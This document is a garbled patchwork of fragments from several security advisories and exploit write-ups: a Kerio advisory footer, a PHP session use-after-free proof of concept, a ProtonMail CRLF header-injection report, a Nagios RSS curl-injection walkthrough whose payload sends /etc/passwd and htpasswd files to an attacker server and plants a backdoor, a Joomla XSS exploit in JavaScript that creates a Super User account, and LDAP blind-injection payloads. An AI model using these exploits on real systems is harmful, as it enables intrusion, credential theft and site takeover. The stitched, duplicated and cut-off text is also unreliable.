 \nThe vendor told us the following regarding vulnerability 9:  \n\"the feature already is in the product\"  \n  \nVulnerability 4 and 8 are not considered a vulnerability by the vendor  \nand will not be fixed.  \nSEC Consult strongly recommended fixing issue 4 and 8 as well.  \n  \nThe latest version can be downloaded from here:  \nhttp://www.kerio.com/support/kerio-control  \nhttp://www.kerio.com/support/kerio-control/release-history  \n  \n  \nWorkaround:  \n-----------  \nNone  \n  \n  \nAdvisory URL:  \n-------------  \nhttps://www.sec-consult.com/en/Vulnerability-Lab/Advisories.htm  \n  \n  \n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  \n  \nSEC Consult Vulnerability Lab  \n  \nSEC Consult  \nBangkok - Berlin - Linz - Montreal - Moscow  \nSingapore - Vienna (HQ) - Vilnius - Zurich  \n  \nAbout SEC Consult Vulnerability Lab  \nThe SEC Consult Vulnerability Lab is an integrated part of SEC Consult.

So we can create\r\nZVAL and free it via the php_var_unserialize() with a crafted\r\nserialized string, and also free the memory (reduce the reference\r\ncount of the ZVAL to zero) via zval_ptr_dtor() with deserialize two\r\nidentical session data, then the next call to php_var_unserialize()\r\nwill still allow to use R: or r: to set references to that already\r\nfreed memory. It is possible to use-after-free attack and execute\r\narbitrary code remotely.\r\n\r\nIn some other cases, session deserializer\r\n(php/php_binary/php_serialize) may also lead to use-after-free\r\nvulnerabilities: i) via crafted Serializable::unserialize() ii) via\r\nunserialize()'s callback function and zend_lookup_class() call a\r\ncrafted __autoload().\r\n\r\nProof of Concept Exploit\r\n------------\r\nThe PoC works on standard MacOSX 10.11 installation of PHP 5.4.44.\r\n\r\n\r\n<?php\r\n\r\nsession_start();\r\n\r\n$fakezval = ptr2str(1122334455);\r\n$fakezval .= ptr2str(0);\r\n$fakezval .= \"\\x00\\x00\\x00\\x00\";\r\n$fakezval .= \"\\x01\";\r\n$fakezval .= \"\\x00\";\r\n$fakezval .= \"\\x00\\x00\";\r\n\r\n$exploit = 'ryat|a:2:{i:0;i:1;i:1;a:1:{i:1;chtg|a:1:{i:0;R:4;}';\r\n// $exploit = 'ryat|a:1:{i:0;i:1;}ryat|i:1;chtg|R:1;';\r\nsession_decode($exploit);\r\n\r\nfor ($i = 0; $i < 5; $i++) {\r\n    $v[$i] = $fakezval.$i;\r\n}\r\n\r\nvar_dump($_SESSION);\r\n\r\nfunction ptr2str($ptr)\r\n{\r\n  $out = \"\";\r\n  for ($i = 0; $i < 8; $i++) {\r\n    $out .= chr($ptr & 0xff);\r\n    $ptr >>= 8;\r\n  }\r\n  return $out;\r\n}\r\n\r\n?>\r\n\r\n\r\nTest the PoC on the command line:\r\n\r\n\r\n$ php uafpoc.php\r\narray(2) {\r\n  [\"ryat\"]=>\r\n  NULL\r\n  [\"chtg\"]=>\r\n  array(1) {\r\n    [0]=>\r\n    int(1122334455)  <===  so we can control the memory and create fake ZVAL :)\r\n  }\r\n}\r\n\r\n",

DESCRIPTION  \n-------------------------  \n  \n  \n-ProtonMail is incorporated in Switzerland and their servers are located   \nin Switzerland.  \n  \n  \n-They are outside of US and EU jurisdiction and all user data is   \nprotected by strict Swiss privacy laws.  \n  \nBecause of our end-to-end encryption, They think that :  \n  \n\"Your data is already secure and encrypted by the time it reaches our   \nservers. We have no access to your messages, and since we cannot decrypt   \nthem, we cannot share them with third parties\".  \n  \n  \n-ProtonMail's segregated authentication and decryption system means   \nlogging into a ProtonMail account that requires two passwords.  \n  \n  \n-The first password is used to authenticate the user and retrieve the   \ncorrect account. After that, encrypted data is sent to the user.  \n  \n  \n-The second password is a decryption password which is never sent to us.   \nIt is used to decrypt the user\u0092s data in the browser so we never have   \naccess to the decrypted data  \n  \nor the decryption password.  \n  \n  \n-For this reason, we are also unable to do password recovery.  \n  \n  \n-If you forget your decryption password, we cannot recover your data.  \n  \n  \n  \n  \nBy theWay, ASAP-SEC are Verifiying this information... Let's go to the   \nbusiness ;)  \n  \n  \n  \n  \n  \nIII- Vulnerabilities  \n---------------------  \n  \n  \nCRLF injection / HTTP response splitting  \n****************************************  \n  \n  \nThis script is possibly vulnerable to CRLF injection attacks.  \n  \nHTTP headers have the structure \"Key:  \n  \nValue\", where each line is separated by the CRLF combination.  \n  \nIf the user input is injected into the value section without properly   \nescaping/removing  \n  \nCRLF characters it is possible to alter the HTTP headers structure.  \n  \nHTTP Response Splitting is a \"new\" application attack technique which   \nenables  \n  \nvarious new attacks such as web cache poisoning,cross user defacement,  \n  \nhijacking pages with sensitive user information and cross-site scripting   \n(XSS).  \n  \n  \nThe attacker sends a single HTTP request that forces the web server to   \nform an output stream,  \n  \nwhich is then interpreted by the target as two HTTP responses instead of   \none response.  \n  \n  \nAffected items  \n------------------  \n  \n/crypt/cryptographp.php  \n  \n  \n  \nThe impact of this vulnerability  \n----------------------------------  \n  \nIs it possible for a remote attacker to inject custom HTTP headers.  \n  \nFor example, an attacker can inject session cookies or HTML code.  \n  \nThis may conduct to vulnerabilities like XSS (cross-site scripting) or   \nsession fixation.  \n  \n  \n  \n  \nHow to fix this vulnerability  \n------------------------------------  \n  \n  \nYou need to restrict CR(0x13) and LF(0x10)  \n  \n  \nFrom  \n  \nthe user input  \n  \nor  \n  \nproperly encode the output  \n  \nin  \n  \norder to prevent the injection  \n  \nof  \n  \ncustom HTTP headers.  \n  \n  \n  \n  \nAttack details  \n--------------------  \n  \nURL encoded GET input cfg was set to   \n<SomeCustomInjectedHeader:injected_by_secnight  \n  \n  \n  \nInjected header found:  \n  \nSomeCustomInjectedHeader: injected_by_secnight  \n  \n  \n  \nGET   \n/crypt/cryptographp.php?cfg=%0d%0a%20SomeCustomInjectedHeader%3ainjected_by_secnight  \n  \n  \n  \n  \n  \nHTTP/1.0 302 Found  \n  \nDate: Wed, 28 May 2014 15:33:55 GMT  \n  \nServer: Apache/2.2.3 (CentOS)  \n  \nX-Powered-By: PHP/5.3.28  \n  \nExpires: Thu, 19 Nov 1981 08:52:00 GMT  \n  \nCache-Control: no-store, no-cache, must-revalidate, post-check=0,   \npre-check=0  \n  \nPragma: no-cache  \n  \nSet-Cookie: cryptcookietest=1  \n  \nLocation: cryptographp.inc.php?cfg=  \n  \nSomeCustomInjectedHeader: injected_by_secnight&sn=PHPSESSID&  \n  \nStrict-Transport-Security: max-age=15768000;includeSubDomains  \n  \nContent-Length: 0  \n  \nConnection: close  \n  \nContent-Type: text/html  \n  \n  \n  \nHow to fix this vulnerability  \n-----------------------------  \n  \n  \nYou need to restrict CR(0x13) and LF(0x10) from the user  \n  \ninput or properly encode the output in order to prevent  \n  \nthe injection of custom HTTP headers.  \n  \n  \n  \n  \n  \nVariant 1  \n-----------  \n  \n  \nGET   \n/crypt/cryptographp.php?cfg=%0d%0a%20SomeCustomInjectedHeader%3ainjected_by_asapsec   \nHTTP/1.1  \n  \nReferer: https://protonmail.ch:443/  \n  \nCookie: PHPSESSID=afaj9rt84m3oevgtld6thfe9l4; cryptcookietest=1  \n  \nHost: protonmail.ch  \n  \nConnection: Keep-alive  \n  \n  \nResponse  \n----------  \n  \n  \nHTTP/1.0 302 Found  \n  \nDate: Wed, 28 May 2014 15:33:55 GMT  \n  \nServer: Apache/2.2.3 (CentOS)  \n  \nX-Powered-By: PHP/5.3.28  \n  \nExpires: Thu, 19 Nov 1981 08:52:00 GMT  \n  \nCache-Control: no-store, no-cache, must-revalidate, post-check=0,   \npre-check=0  \n  \nPragma: no-cache  \n  \nSet-Cookie: cryptcookietest=1  \n  \nLocation: cryptographp.inc.php?cfg=  \n  \nSomeCustomInjectedHeader: injected_by_wvs&sn=PHPSESSID&  \n  \nStrict-Transport-Security: max-age=15768000;includeSubDomains  \n  \nContent-Length: 0  \n  \nConnection: close  \n  \nContent-Type: text/html  \n  \n  \n  \n  \n  \n  \nApache 2.x version older than 2.2.10  \n**************************************  \n  \n  \nFixed in Apache httpd 2.2.10: mod_proxy_ftp globbing XSS CVE-2008-2939  \n  \nA flaw was found in the handling of wildcards in the path of a FTP URL   \nwith mod_proxy_ftp.  \n  \nIf mod_proxy_ftp is enabled to support FTP-over-HTTP, requests   \ncontaining globbing characters could lead to cross-site scripting (XSS)   \nattacks.  \n  \nAffected Apache versions (2.2.9, 2.2.8, 2.2.6, 2.2.5, 2.2.4, 2.2.3,   \n2.2.2, 2.2.0).  \n  \n  \n  \n  \nApache httpd remote denial of service  \n*************************************  \n  \n  \nVulnerability description  \n------------------------------  \n  \n  \nA denial of service vulnerability has been found in the way the multiple  \n  \noverlapping ranges are handled by the Apache HTTPD server:  \n  \n  \n  \n  \nhttp://seclists.org/fulldisclosure/2011/Aug/175  \n  \n  \n  \nAn attack tool is circulating in the wild.

According to the code logic point of view,`_httpsrequet `is `usr/local/nagios/share/includes/rss/rss_fetch. inc `in the `fetch_rss `function call, so that we create such a test file `test.php `to:\n\n``php &lt;? php define('MAGPIE_DIR', './ includes/rss/'); define('MAGPIE_CACHE_ON', 0); define('MAGPIE_CACHE_AGE', 0); define('MAGPIE_CACHE_DIR', '/tmp/magpie_cache'); require_once(MAGPIE_DIR.'rss_fetch. inc');\n\nfetch_rss('https://www.baidu.com --version'); ``\n\nAccess `http://127.0.0.1/nagios/test.php `after turn on dynamic debugging, we in the `exec `function at the lower breakpoint, the call stack is as follows:\n\n![Alt text](https://images.seebug.org/content/images/2016/12/req-call.png)\n\n`$URI `as follows:\n\n![Alt text](https://images.seebug.org/content/images/2016/12/uri-control.png)\n\nShows the`$URI `controlled, and in the incoming process has not been filtered.\n\nNext we need to construct `the curl `parameters to get the results we want, here we use Dawid Golunski provide the [Exp](<https://github.com/0xwindows/VulScritp/blob/master/nagios/nagios_cmd_injection.py>), it is noted that he provided the code to verify that 4. 2. 0 before version to verify the version greater than or equal to 4. 2. 0 and less than 4. 2. 2, The need for which code is about to change, coupled with the closure needed to double the quotes:\n\n``python\n\n# Line 44\n\nself. redirect('https://' + self. request. host + '/nagioshack\" -Fpasswd=@/etc/passwd-Fgroup=@/etc/group-Fhtauth=@/usr/local/nagios/etc/htpasswd.users --trace-ascii ' + backdoor_path + '\"', permanent=False) `` \n\nThe Exp of the specific process is as follows:\n\n  1. The attacker on the server to open a http/https Server\n  2. Victims using `fetch_rss `to the server to send its request\n  3. The attacker receives the request to redirect, redirect url to `https:// + the attacker's server + payload`, the payload in the use`-F `the file content is sent to the server, the`--trace-ascii `will flow records to the file, similar to Roundcube RCE in the `mail `function of`-X `is.\n  4. The server receives the redirected request after the following three operations:\n    1. Parse the file content\n    2. Return to the back door content and then through the flow record is written to the backdoor file\n    3. Returns the constructed XML in the `description`, add`<img src=backdoor.php>`\n  5. Victims parse the XML and the `description `of the contents of the output to html, and then automatically performs back door\n\nIn order to facilitate verification, we are in the website directory create a `exp.php`:\n\n``php &lt;? php define('MAGPIE_DIR', './ includes/rss/'); define('MAGPIE_CACHE_ON', 0); define('MAGPIE_CACHE_AGE', 0); define('MAGPIE_CACHE_DIR', '/tmp/magpie_cache'); require_once(MAGPIE_DIR.'rss_fetch. inc');\n\nfetch_rss('http://172.17.0.3'); ``\n\nOnly for validation vulnerability, where we don't have to parse the XML and then we `172.17.0.3 `run on Exp, and then access the `http://127.0.0.1/exp.php `you can get the results:\n\n![Alt text](https://images.seebug.org/content/images/2016/12/exp.png)\n\nThe actual testing Exp in back door code is possible in the log will be truncated resulting in command execution is unsuccessful, recommended to write a brief word:\n\n![Alt text](https://images.seebug.org/content/images/2016/12/backdoor.png)\n\nThe real case, the `fetch_rss `call as follows:\n\n![Alt text](https://images.seebug.org/content/images/2016/12/req-call-1.png)\n\nVisible we can not control the values of the parameters, it can only be by dns spoofing and other means to make the target of the `https://www.nagios.org `the access point to the attacker's server, and then trigger the vulnerability.\n\n### 3\\.

            "description": "Joomla! is one of the world's most popular content management system (CMS) solutions. It enables users to build custom Web sites and powerful online applications. More than 3 percent of Web sites are running Joomla!, and it accounts for more than 9 percent of CMS market share.\r\n\r\nAs of November 2016, Joomla! had been downloaded over 78 million times. Over 7,800 free and commercial extensions are also currently available from the official Joomla! Extension Directory, and more are available from other sources.\r\n\r\nThis year, as a FortiGuard researcher I discovered and reported two Cross-Site Scripting (XSS) vulnerabilities in Joomla!. They are identified as CVE-2017-7985 and CVE-2017-7986. Joomla! patched them  this week. These vulnerabilities affect Joomla! versions 1.5.0 through 3.6.5. They exist because these versions of Joomla! fail to sanitize malicious user input when users post or edit an article. Remote attacker could exploit them to run malicious code in victims\u2019 browser, potentially allowing the attacker to gain control of the victim\u2019s Joomla! account. If the victim has higher permission, like system administrator, the remote attacker could gain full control of the web server.\r\n\r\nIn this blog, I will share the details of these vulnerabilities.\r\n\r\n### Background\r\nJoomla! has its own XSS filters. For example, a user with post permission is not allowed to use full HTML elements. When this user posts an article with HTML attributes, Joomla! will sterilize dangerous code like \u201cjavascript:alert()\u201d, \u201cbackground:url()\u201d and so on. Joomla! has two ways to achieve this sterilization. On the client side, it uses the editor called \u201cTinyMCE.\u201d On the server side, it sanitizes the request before storing it on the server.\r\n\r\n### Analysis\r\nTo demonstrate these vulnerabilities, the test account \u2018yzy1\u2019 is created. It has author permission, which is not allowed to use full HTML elements.\r\n\r\nTo bypass the client side sterilization, the attacker can use a network intercept tool like Burp Suite or just change the default editor to other Joomla! built-in editors, like CoodeMirror or None, as shown in Figure 1.\r\n\r\n\r\n![Figure1](https://d3gpjj9d20n0p3.cloudfront.net/ngblog/uploads/files/JoomlaCoreXSS001.png)\r\nFigure 1. Bypassing the client side XSS filter\r\n\r\nOn the server side, I found two ways to bypass the XSS filters. They are identified as CVE-2017-7985 and CVE-2017-7986.\r\n\r\n### CVE-2017-7985\r\nThe Joomla! server side XSS filter sterilizes dangerous code and saves the safe characters. For example, when we post the following code with the test account,  Joomla! sterilizes it by double quoting the , deleting the , and adding safe links to the URLs, as shown in Figure 2.\r\n\r\n\r\n![Figure2](https://d3gpjj9d20n0p3.cloudfront.net/ngblog/uploads/files/JoomlaCoreXSS003.png)\r\nFigure 2. Joomla! XSS filter\r\n\r\nBut an attacker could take advantage of the filter by trying to let the filter to reconstruct the code and rebuild the scripts. For example, we can add the code Note that the double quote in  is the CORRECT DOUBLE QUOTATION MARK, as shown in Figure 3.\r\n\r\n\r\n![Figure3](https://d3gpjj9d20n0p3.cloudfront.net/ngblog/uploads/files/JoomlaCoreXSS005.png)\r\nFigure 3. Inserting the PoC for CVE-2017-7985\r\n\r\nWhen victims access the post, regardless of whether it\u2019s published or not, the inserted XSS code will be triggered in both the main page and the administrator page, as shown in Figures 4 and 5.\r\n\r\n\r\n![Figure4](https://d3gpjj9d20n0p3.cloudfront.net/ngblog/uploads/files/JoomlaCoreXSS007.jpg)\r\nFigure 4. CVE-2017-7985 PoC triggered in the home page\r\n\r\n![Figure5](https://d3gpjj9d20n0p3.cloudfront.net/ngblog/uploads/files/JoomlaCoreXSS009.png)\r\n\r\nFigure 5. CVE-2017-7985 PoC triggered in the administrator page\r\n\r\n### Solution\r\nAll users of Joomla! should upgrade to the latest version immediately. Additionally, organizations that have deployed Fortinet IPS solutions are already protected from these vulnerabilities with the signatures Joomla!.Core.Article.Post.Colon.Char.XSS and Joomla!.Core.Article.Post.Quote.Char.XSS.",

On the client side, it uses the editor called \u201cTinyMCE.\u201d On the server side, it sanitizes the request before storing it on the server.\r\n\r\n### Analysis\r\nTo demonstrate these vulnerabilities, the test account \u2018yzy1\u2019 is created. It has author permission, which is not allowed to use full HTML elements.\r\n\r\nTo bypass the client side sterilization, the attacker can use a network intercept tool like Burp Suite or just change the default editor to other Joomla! built-in editors, like CoodeMirror or None, as shown in Figure 1.\r\n\r\n\r\n![Figure1](https://d3gpjj9d20n0p3.cloudfront.net/ngblog/uploads/files/JoomlaCoreXSS001.png)\r\nFigure 1. Bypassing the client side XSS filter\r\n\r\nOn the server side, I found two ways to bypass the XSS filters. They are identified as CVE-2017-7985 and CVE-2017-7986.\r\n\r\n### CVE-2017-7986\r\nWhen posting an article, the attacker could bypass the XSS filter in an HTML  tag by changing the script from  to , because the  is the mark \u201c:\u201d in HTML format. The attacker could then trigger this script code by adding a  tag. For example, the attacker can insert the following code in an article , as shown in Figure 6. \r\n\r\n \r\n\r\n\r\n![Figure6](https://d3gpjj9d20n0p3.cloudfront.net/ngblog/uploads/files/JoomlaCoreXSS011.png)\r\nFigure 6. Insert the PoC for CVE-2017-7986\r\n\r\nWhen victims access the post, regardless of whether it\u2019s published or not, and click the \u201cClick Me\u201d button, the inserted XSS code will be triggered in both the main page and the administrator page, as shown in Figures 7 and 8.\r\n\r\n\r\n![Figure7](https://d3gpjj9d20n0p3.cloudfront.net/ngblog/uploads/files/JoomlaCoreXSS013.png)\r\nFigure 7. CVE-2017-7986 PoC triggered in home page\r\n\r\n\r\n![Figure8](https://d3gpjj9d20n0p3.cloudfront.net/ngblog/uploads/files/JoomlaCoreXSS015.png)\r\nFigure 8. CVE-2017-7986 PoC triggered in administrator page\r\n\r\nExploit\r\nHere I provide an exploit example for CVE-2017-7986 that allows an attacker with a low permission account to create a Super User account and upload a web shell. To achieve this, I will write a small piece of JavaScript code for creating a Super User account by using the site administrator\u2019s permission. It first obtains the CSRF token from the user edit page , and then posts the Super User account creation request to the server with the stolen CSRF token. The new Super User will be \u2018Fortinet Yzy\u2019 with the password \u2018test\u2019.\r\n```\r\nvar request = new XMLHttpRequest();\r\nvar req = new XMLHttpRequest();\r\nvar id = '';\r\nvar boundary = Math.random().toString().substr(2);\r\nvar space = \"-----------------------------\";\r\n\r\nrequest.open('GET', 'index.php?option=com_users&view=user&layout=edit', true);\r\nrequest.onload = function() {\r\n    if (request.status >= 200 && request.status < 400) {\r\n        var resp = request.responseText;\r\n        var myRegex = /<input type=\"hidden\" name=\"([a-z0-9]+)\" value=\"1\" \\/>/;\r\n        id = myRegex.exec(resp)[1];\r\n        req.open('POST', 'index.php?option=com_users&layout=edit&id=0', true);\r\n        req.setRequestHeader(\"content-type\", \"multipart/form-data; boundary=---------------------------\" + boundary);\r\n        var multipart = space + boundary +\r\n            \"\\r\\nContent-Disposition: form-data; name=\\\"jform[name]\\\"\" +\r\n            \"\\r\\n\\r\\nFortinet Yzy\\r\\n\" +\r\n            space + boundary +\r\n            \"\\r\\nContent-Disposition: form-data; name=\\\"jform[username]\\\"\" +\r\n            \"\\r\\n\\r\\nfortinetyzy\\r\\n\" +\r\n            space + boundary +\r\n            \"\\r\\nContent-Disposition: form-data; name=\\\"jform[password]\\\"\" +\r\n            \"\\r\\n\\r\\ntest\\r\\n\" +\r\n            space + boundary +\r\n            \"\\r\\nContent-Disposition: form-data; name=\\\"jform[password2]\\\"\" +\r\n            \"\\r\\n\\r\\ntest\\r\\n\" +\r\n            space + boundary +\r\n            \"\\r\\nContent-Disposition: form-data; name=\\\"jform[email]\\\"\" +\r\n            \"\\r\\n\\r\\nzyg@gmail.com\\r\\n\" +\r\n            space + boundary +\r\n            \"\\r\\nContent-Disposition: form-data; name=\\\"jform[registerDate]\\\"\" +\r\n            \"\\r\\n\\r\\n\\r\\n\" +\r\n            space + boundary +\r\n            \"\\r\\nContent-Disposition: form-data; name=\\\"jform[lastvisitDate]\\\"\" +\r\n            \"\\r\\n\\r\\n\\r\\n\" +\r\n            space + boundary +\r\n            \"\\r\\nContent-Disposition: form-data; name=\\\"jform[lastResetTime]\\\"\" +\r\n            \"\\r\\n\\r\\n\\r\\n\" +\r\n            space + boundary +\r\n            \"\\r\\nContent-Disposition: form-data; name=\\\"jform[resetCount]\\\"\" +\r\n            \"\\r\\n\\r\\n0\\r\\n\" +\r\n            space + boundary +\r\n            \"\\r\\nContent-Disposition: form-data; name=\\\"jform[sendEmail]\\\"\" +\r\n            \"\\r\\n\\r\\n0\\r\\n\" +\r\n            space + boundary +\r\n            \"\\r\\nContent-Disposition: form-data; name=\\\"jform[block]\\\"\" +\r\n            \"\\r\\n\\r\\n0\\r\\n\" +\r\n            space + boundary +\r\n            \"\\r\\nContent-Disposition: form-data; name=\\\"jform[requireReset]\\\"\" +\r\n            \"\\r\\n\\r\\n0\\r\\n\" +\r\n            space + boundary +\r\n            \"\\r\\nContent-Disposition: form-data; name=\\\"jform[id]\\\"\" +\r\n            \"\\r\\n\\r\\n0\\r\\n\" +\r\n            space + boundary +\r\n            \"\\r\\nContent-Disposition: form-data; name=\\\"jform[groups][]\\\"\" +\r\n            \"\\r\\n\\r\\n8\\r\\n\" +\r\n            space + boundary +\r\n            \"\\r\\nContent-Disposition: form-data; name=\\\"jform[params][admin_style]\\\"\" +\r\n            \"\\r\\n\\r\\n\\r\\n\" +\r\n            space + boundary +\r\n            \"\\r\\nContent-Disposition: form-data; name=\\\"jform[params][admin_language]\\\"\" +\r\n            \"\\r\\n\\r\\n\\r\\n\" +\r\n            space + boundary +\r\n            \"\\r\\nContent-Disposition: form-data; name=\\\"jform[params][language]\\\"\" +\r\n            \"\\r\\n\\r\\n\\r\\n\" +\r\n            space + boundary +\r\n            \"\\r\\nContent-Disposition: form-data; name=\\\"jform[params][editor]\\\"\" +\r\n            \"\\r\\n\\r\\n\\r\\n\" +\r\n            space + boundary +\r\n            \"\\r\\nContent-Disposition: form-data; name=\\\"jform[params][helpsite]\\\"\" +\r\n            \"\\r\\n\\r\\n\\r\\n\" +\r\n            space + boundary +\r\n            \"\\r\\nContent-Disposition: form-data; name=\\\"jform[params][timezone]\\\"\" +\r\n            \"\\r\\n\\r\\n\\r\\n\" +\r\n            space + boundary +\r\n            \"\\r\\nContent-Disposition: form-data; name=\\\"task\\\"\" +\r\n            \"\\r\\n\\r\\nuser.apply\\r\\n\" +\r\n            space + boundary +\r\n            \"\\r\\nContent-Disposition: form-data; name=\\\"\" + id + \"\\\"\" +\r\n            \"\\r\\n\\r\\n1\\r\\n\" +\r\n            space + boundary + \"--\\r\\n\";\r\n        req.onload = function() {\r\n            if (req.status >= 200 && req.status < 400) {\r\n                var resp = req.responseText;\r\n                console.log(resp);\r\n            }\r\n        };\r\n        req.send(multipart);\r\n    }\r\n};\r\n\r\nrequest.send();\r\n```\r\nAn attacker can add this code to Joomla!

            "sourceData": "With over 84 million downloads, Joomla! is one of the most popular content management systems in the World Wide Web. It powers about 3.3% of all websites\u2019 content and articles. Our code analysis solution RIPS detected a previously unknown LDAP injection vulnerability in the login controller. This one vulnerability could allow remote attackers to leak the super user password with blind injection techniques and to fully take over any Joomla! <= 3.7.5 installation within seconds that uses LDAP for authentication. Joomla! has fixed the vulnerability in the latest version 3.8.\r\n\r\n\r\nRequirements - Who is affected\r\nInstallations with the following requirements are affected by this vulnerability:\r\n\r\nJoomla! version 1.5 <= 3.7.5 is installed\r\nJoomla! is configured to use LDAP for authentication\r\nThis is not a configuration flaw and an attacker does not need any privileges to exploit this vulnerability.\r\n\r\n\r\nImpact - What can an attacker do\r\nBy exploiting a vulnerability in the login page, an unprivileged remote attacker can efficiently extract all authentication credentials of the LDAP server that is used by the Joomla! installation. These include the username and password of the super user, the Joomla! administrator. An attacker can then use the hijacked information to login to the administrator control panel and to take over the Joomla! installation, as well as potentially the web server, by uploading custom Joomla! extensions for remote code execution.\r\n\r\n\r\nVulnerability Analysis - CVE-2017-14596\r\nOur code analysis solution RIPS automatically identified the vulnerability that spans over the following nested code lines. First, in the LoginController the Joomla! application receives the user-supplied credentials from the login form.\r\n\r\n/administrator/components/com_login/controller.php\r\nclass LoginController extends JControllerLegacy\r\n{\r\n    public function login()\r\n    {\r\n        \u22ee\r\n        $app = JFactory::getApplication();\r\n        \u22ee\r\n        $model = $this->getModel('login');\r\n        $credentials = $model->getState('credentials');\r\n        \u22ee\r\n        $app->login($credentials, array('action' => 'core.login.admin'));\r\n    }\r\n}\r\n \r\nThe credentials are passed on to the login method which then invokes the authenticate method.\r\n\r\n/libraries/cms/application/cms.php\r\nclass JApplicationCms extends JApplicationWeb\r\n{\r\n    public function login($credentials, $options = array())\r\n    {\r\n        \u22ee\r\n        $authenticate = JAuthentication::getInstance();\r\n        $authenticate->authenticate($credentials, $options);\r\n    }\r\n}\r\n \r\n/libraries/joomla/authentication/authentication.php\r\nclass JAuthentication extends JObject\r\n{\r\n    public function authenticate($credentials, $options = array())\r\n    {\r\n    \u22ee\r\n        $plugin->onUserAuthenticate($credentials, $options, $response);\r\n    }\r\n}\r\n \r\nBased on the plugin that is used for authentication, the authenticate method passes the credentials to the onUserAuthenticate method. If Joomla! is configured to use LDAP for authentication, the LDAP plugin\u2019s method is invoked.\r\n\r\n/plugins/authentication/ldap/ldap.php\r\nclass PlgAuthenticationLdap extends JPlugin\r\n{\r\n    public function onUserAuthenticate($credentials, $options, &amp;$response)\r\n    {\r\n        \u22ee\r\n        $userdetails = $ldap->simple_search(\r\n            str_replace(\r\n                '[search]',\r\n                $credentials['username'],\r\n                $this->params->get('search_string')\r\n            )\r\n        );\r\n    }\r\n}\r\n \r\nIn the LDAP plugin, the username credential is embedded into the LDAP query specified in the search_string option. According to the official Joomla! documentation, the search_string configuration option is \u201ca query string used to search for the user, where [search] is directly replaced by search text from the login field\u201d, for example \u201cuid=[search]\u201c. The LDAP query is then passed to the simple_search method of the LdapClient which connects to the LDAP server and performs the ldap_search.\r\n\r\n/libraries/vendor/joomla/ldap/src/LdapClient.php\r\nclass LdapClient\r\n{\r\n    public function simple_search($search)\r\n    {\r\n        $results = explode(';', $search);\r\n        foreach ($results as $key => $result)\r\n        {\r\n            $results[$key] = '(' . $result .

The vulnerability was detected within 7 minutes in half a million lines of Joomla! code.\r\n\r\nThe truncated analysis results are available in our RIPS demo application. Please note that we limited the results to the issues described in this post in order to ensure a fix is available.\r\n\r\n See RIPS report\r\nProof Of Concept - Blind LDAP Injection\r\nThe lack of input sanitization of the username credential used in the LDAP query allows an adversary to modify the result set of the LDAP search. By using wildcard characters and by observing different authentication error messages, the attacker can literally search for login credentials progressively by sending a row of payloads that guess the credentials character by character.\r\n\r\n\r\nXXX;(&amp;(uid=Admin)(userPassword=A*))\r\nXXX;(&amp;(uid=Admin)(userPassword=B*))\r\nXXX;(&amp;(uid=Admin)(userPassword=C*))\r\n...\r\nXXX;(&amp;(uid=Admin)(userPassword=s*))\r\n...\r\nXXX;(&amp;(uid=Admin)(userPassword=se*))\r\n...\r\nXXX;(&amp;(uid=Admin)(userPassword=sec*))\r\n...\r\nXXX;(&amp;(uid=Admin)(userPassword=secretPassword))\r\n\r\nEach of these payloads yield exactly one out of two possible states which allow an adversary to abuse the server as an Oracle. A filter bypass is necessary for exploitation that is not covered in this blog post. With an optimized version of these payloads one bit per request can be extracted from the LDAP server which results in a highly efficient blind LDAP injection attack.\r\n\r\n\r\nTime Line\r\nDate\tWhat\r\n2017/07/27\tProvided vulnerability details and PoC to vendor\r\n2017/07/29\tVendor confirmed security issue\r\n2017/09/19\tVendor released fixed version\r\n\r\n\r\nSummary\r\nAs one of the most popular open source CMS applications, Joomla! receives many code reviews from the security community. Yet alone one missed security vulnerability in the 500,000 lines of code can lead to a server compromise. With the help of static code analysis, RIPS detected a critical LDAP injection vulnerability (CVE-2017-14596) that remained undiscovered for over 8 years. The vulnerability allows an attacker to steal login credentials from Joomla! installations that use LDAP authentication.\r\n\r\nWe would like to thank the Joomla! Security Strike Team for an excellent coordination and remediation of this issue and recommend to update to the latest Joomla! version 3.8 immediately.\n\n#  0day.today [2018-04-03]  #",

First, in the `LoginController ` the Joomla! the application receives the user-supplied credentials from the login form.\n\n`/administrator/components/com_login/controller.php` `class LoginController extends JControllerLegacy { public function login() { \u22ee $app = JFactory::getApplication(); \u22ee $model = $this->getModel('login'); $credentials = $model->getState('credentials'); \u22ee $app->login($credentials, array('action' => 'core. login. admin')); } }`\n\nThe credentials are passed on to the `login ` method which then invokes the `authenticate ` method.\n\n`/libraries/cms/application/cms.php` `class JApplicationCms extends JApplicationWeb { public function login($credentials, $options = array()) { \u22ee $authenticate = JAuthentication::getInstance(); $authenticate->authenticate($credentials, $options); } }`\n\n`/libraries/joomla/authentication/authentication.php` `class JAuthentication extends JObject { public function authenticate($credentials, $options = array()) { \u22ee $plugin->onUserAuthenticate($credentials, $options, $response); } }`\n\nBased on the plugin that is used for authentication, the `authenticate ` method passes the credentials to the `onUserAuthenticate ` method. If Joomla! is configured to use LDAP for authentication, the LDAP plugin's method is invoked.\n\n`/plugins/authentication/ldap/ldap.php` `class PlgAuthenticationLdap extends JPlugin { public function onUserAuthenticate($credentials, $options, &$response) { \u22ee $userdetails = $ldap->simple_search( str_replace( '[search]', $credentials['username'], $this->params->get('search_string') ) ); } }`\n\nIn the LDAP plugin, the `username ` credential is embedded into the LDAP query specified in the `search_string ` option. According to the official [Joomla! documentation](<https://docs.joomla.org/LDAP_Authentication>), the `search_string ` configuration option is \u201ca query string used to search for the user, where [search] is directly replaced by the search text from the login field\u201d, for example \u201cuid=[search]\u201c. The LDAP query is then passed to the `simple_search ` method of the `LdapClient ` which connects to the LDAP server and performs the `ldap_search`.\n\n`/libraries/vendor/joomla/ldap/src/LdapClient.php` `` class LdapClient { public function simple_search($search) { $results = explode(';', $search); foreach ($results as $key =&gt; $result) { $results[$key] = '(' . $result . ')'; } return $this-&gt;search($results); }\n    \n    \n    public function search(array $filters, ...)\n    {\n     foreach ($filters as $search_filter)\n    {\n     $search_result = @ldap_search($res, $dn, $search_filter, $attr);\n    \u22ee\n    }\n    }\n    \n\n} ``\n\nEven if RIPS is unaware of the exact LDAP query that is loaded from an external configuration file, RIPS detects and reports successfully the root cause of this vulnerability: User input is mixed unsanitized with the LDAP query markup that is passed to the sensitive `ldap_search ` function. The vulnerability was detected within 7 minutes in half a million lines of Joomla! code.\n\nThe truncated analysis results are available in our RIPS demo application. Please note that we limited the results to the issues described in this post in order to ensure a fix is available.\n\n[See RIPS 